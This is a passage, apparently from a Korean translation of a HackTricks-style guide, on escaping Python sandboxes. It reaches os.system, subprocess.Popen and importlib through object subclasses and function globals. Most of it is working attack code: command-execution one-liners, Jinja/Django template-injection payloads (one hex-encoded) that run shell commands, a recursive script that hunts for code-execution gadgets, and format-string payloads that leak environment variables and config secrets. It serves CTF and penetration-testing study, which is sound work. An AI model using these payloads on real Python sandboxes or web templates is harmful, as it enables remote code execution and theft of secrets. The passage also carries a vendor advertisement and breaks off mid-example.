'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**아래에는 더 큰 함수**](./#재귀-적인-내장-글로벌-검색)가 있으며, 여기에서는 **글로벌 변수를 찾을 수 있는 수십/수백 개의 위치**를 찾는 방법을 설명하고 있습니다.

## 임의 실행 발견하기

여기에서는 **더 위험한 기능을 쉽게 발견**하고 더 신뢰할 수 있는 공격 방법을 제안하는 방법을 설명하고자 합니다.

#### 우회를 통한 서브클래스 접근

이 기술의 가장 민감한 부분 중 하나는 **기본 서브클래스에 접근할 수 있는지 여부**입니다. 이전 예제에서는 `''.__class__.__base__.__subclasses__()`를 사용하여 이를 수행했지만, **다른 가능한 방법**도 있습니다:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### 위험한 라이브러리 찾기

예를 들어, 라이브러리 **`sys`**를 사용하여 **임의의 라이브러리를 가져올 수 있다는 것을 알고 있다면**, **sys를 내부에서 가져온 모든 로드된 모듈**을 검색할 수 있습니다:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
많은 것들이 있습니다. **우리는 하나만 필요합니다**. 명령을 실행하기 위해서요:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
우리는 **다른 라이브러리**를 사용하여 **명령을 실행**할 수 있다는 것을 알고 있으므로 동일한 작업을 수행할 수 있습니다:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
또한, 우리는 악성 라이브러리를 로드하는 모듈을 검색할 수도 있습니다:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
또한, **다른 라이브러리**가 **명령어를 실행하기 위해 함수를 호출**할 수 있다고 생각한다면, 우리는 또한 가능한 라이브러리 내에서 **함수 이름으로 필터링**할 수도 있습니다:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## 내장 함수, 전역 변수 등의 재귀적 검색

{% hint style="warning" %}
이것은 정말 **멋진** 기능입니다. 만약 **globals, builtins, open 또는 다른 어떤 객체를 찾고 있다면**, 이 스크립트를 사용하여 **해당 객체를 찾을 수 있는 장소를 재귀적으로 검색**할 수 있습니다.
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
이 스크립트의 출력은 다음 페이지에서 확인할 수 있습니다:

{% content-ref url="broken-reference" %}
[링크가 깨진 곳](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 더 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 애플리케이션 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python 포맷 문자열

**포맷될** **문자열**을 python에 **보내면**, `{}`를 사용하여 **python 내부 정보에 접근**할 수 있습니다. 이전 예제를 사용하여 전역 변수나 내장 함수에 접근할 수 있습니다.

{% hint style="info" %}
그러나, **제한 사항**이 있습니다. `.[]` 기호만 사용할 수 있으므로 임의의 코드를 실행할 수는 없고 정보만 읽을 수 있습니다.\
_**이 취약점을 통해 코드를 실행하는 방법을 알고 있다면, 저에게 연락해주세요.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
일반적인 방법으로 속성에 접근할 때는 `people_obj.__init__`와 같이 **점**을 사용하여 접근할 수 있으며, 딕셔너리 요소에는 따옴표 없이 **괄호**를 사용하여 접근할 수 있습니다. `__globals__[CONFIG]`

또한 객체의 요소를 열거하기 위해 `.__dict__`를 사용할 수 있습니다. `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)` 

포맷 문자열의 다른 흥미로운 특성은 **`!s`**, **`!r`**, **`!a`**를 추가하여 지정된 객체에서 **`str`**, **`repr`**, **`ascii`** 함수를 **실행**할 수 있다는 것입니다.
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
또한, 클래스에서 **새로운 포매터를 코드화**할 수도 있습니다:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**더 많은 예시**는 [**https://pyformat.info/**](https://pyformat.info)에서 **포맷 문자열** 예시를 찾을 수 있습니다.

{% hint style="danger" %}
또한 다음 페이지에서는 Python 내부 객체에서 **민감한 정보를 읽는 가젯**을 확인할 수 있습니다:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### 민감한 정보 노출 Payloads
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Python 객체 해체

{% hint style="info" %}
**파이썬 바이트코드**에 대해 **깊이있게** 배우고 싶다면 이 **멋진** 게시물을 읽어보세요: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

일부 CTF에서는 **플래그가 있는 사용자 정의 함수의 이름**이 제공될 수 있으며, 해당 함수의 **내부**를 확인하여 추출해야 할 수도 있습니다.

검사해야 할 함수는 다음과 같습니다:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir

`dir` 함수는 객체가 가지고 있는 속성과 메서드의 이름을 나열하는 데 사용됩니다.

```python
dir(object)
```

**인자:**
- `object`: 속성과 메서드를 나열할 객체입니다.

**반환값:**
- 객체가 가지고 있는 속성과 메서드의 이름을 담은 리스트입니다.

예를 들어, 다음과 같이 사용할 수 있습니다:

```python
>>> dir("hello")
